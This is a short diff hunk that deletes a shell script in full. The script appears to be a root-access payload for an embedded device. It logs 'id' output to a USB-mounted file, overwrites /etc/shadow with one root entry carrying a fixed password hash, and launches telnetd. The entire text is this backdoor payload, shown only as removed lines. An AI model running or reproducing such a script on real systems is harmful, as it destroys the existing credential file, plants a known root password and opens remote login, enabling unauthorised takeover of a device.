@@ -1,6 +1,0 @@
-#!/bin/sh
-echo ran > /mnt/usbnet/RESULT
-id >> /mnt/usbnet/RESULT
-echo 'root:$1$ouLOV500$R5LCUppbxY40r9uLE8la61:0:0:99999:7:::' > /etc/shadow
-echo shadow-done >> /mnt/usbnet/RESULT
-telnetd &
